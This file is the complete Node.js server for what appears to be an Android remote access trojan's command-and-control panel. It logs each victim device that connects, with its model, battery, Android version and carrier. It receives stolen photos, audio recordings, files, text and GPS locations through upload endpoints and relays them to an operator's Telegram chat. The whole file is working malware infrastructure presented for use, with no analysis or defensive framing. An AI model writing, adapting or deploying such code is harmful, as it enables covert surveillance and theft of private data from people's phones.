const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const stream = require('stream');

const token = process.env.TOKEN;
const id = process.env.ID;
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new WebSocket.Server({ server: appServer, perMessageDeflate: true }); // Habilitar compresión de mensajes WebSocket
const appBot = new TelegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

const { handleMessage } = require('./botMessageHandlers');
const { handleCallbackQuery } = require('./botCallbackQueryHandlers');

app.get('/', function (req, res) {
  res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>');
});

app.post("/uploadImage", upload.single('file'), async (req, res) => {
  try {
    const name = req.file.originalname;
    const fileStream = new stream.PassThrough();
    fileStream.end(req.file.buffer);
    await appBot.sendPhoto(id, fileStream, {
      caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
      parse_mode: "HTML"
    }, {
      contentType: 'image/*',
      filename: name
    });
    res.send('');
  } catch (err) {
    console.error('Error al enviar la imagen:', err);
    res.status(500).send('Error al enviar la imagen');
  }
});

app.post("/uploadAudio", upload.single('file'), async (req, res) => {
  try {
    const name = req.file.originalname;
    const fileStream = new stream.PassThrough();
    fileStream.end(req.file.buffer);
    await appBot.sendAudio(id, fileStream, {
      caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
      parse_mode: "HTML"
    }, {
      contentType: 'audio/*',
      filename: name
    });
    res.send('');
  } catch (err) {
    console.error('Error al enviar el audio:', err);
    res.status(500).send('Error al enviar el audio');
  }
});

app.post("/uploadFile", upload.single('file'), async (req, res) => {
  try {
    const name = req.file.originalname;
    const fileStream = new stream.PassThrough();
    fileStream.end(req.file.buffer);
    await appBot.sendDocument(id, fileStream, {
      caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
      parse_mode: "HTML"
    }, {
      filename: name,
      contentType: 'application/txt',
    });
    res.send('');
  } catch (err) {
    console.error('Error al enviar el archivo:', err);
    res.status(500).send('Error al enviar el archivo');
  }
});

app.post("/uploadText", async (req, res) => {
  try {
    await appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], { parse_mode: "HTML" });
    res.send('');
  } catch (err) {
    console.error('Error al enviar el texto:', err);
    res.status(500).send('Error al enviar el texto');
  }
});

app.post("/uploadLocation", async (req, res) => {
  try {
    await appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    await appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, { parse_mode: "HTML" });
    res.send('');
  } catch (err) {
    console.error('Error al enviar la ubicación:', err);
    res.status(500).send('Error al enviar la ubicación');
  }
});

appSocket.on('connection', (ws, req) => {
  const uuid = uuid4.v4();
  const model = req.headers.model;
  const battery = req.headers.battery;
  const version = req.headers.version;
  const brightness = req.headers.brightness;
  const audio_mode = req.headers.audio_mode;
  const provider = req.headers.provider;

  ws.uuid = uuid;
  appClients.set(uuid, {
    model: model,
    battery: battery,
    version: version,
    brightness: brightness,
    audio_mode: audio_mode,
    provider: provider
  });

  appBot.sendMessage(id,
    `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
    `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
    `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
    `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
    `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
    `• ᴀᴜᴅɪᴏ ᴍᴏᴅᴇ: <b>${audio_mode}</b>\n` +
    `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
    { parse_mode: "HTML" }
  );

  ws.on('close', function () {
    appBot.sendMessage(id,
      `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n` +
      `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
      `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
      `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
      `• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>${brightness}</b>\n` +
      `• ᴀᴜᴅɪᴏ ᴍᴏᴅᴇ: <b>${audio_mode}</b>\n` +
      `• ᴘʀᴏᴠɪᴅᴇʀ : <b>${provider}</b>`,
      { parse_mode: "HTML" }
    );
    appClients.delete(ws.uuid);
  });
});

function configureTelegramBot() {
  appBot.on('message', handleMessage);
  appBot.on('callback_query', handleCallbackQuery);
}

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 10 }); // Pool de conexiones HTTP

setInterval(function () {
  appSocket.clients.forEach(function each(ws) {
    ws.send('ping', { compress: true }); // Enviar mensajes comprimidos
  });

  try {
    axios.get(address, { httpAgent }).then(r => "");
  } catch (e) {
    console.error('Error en la petición GET:', e);
  }
}, 5000);

configureTelegramBot();

appServer.listen(process.env.PORT || 8999);
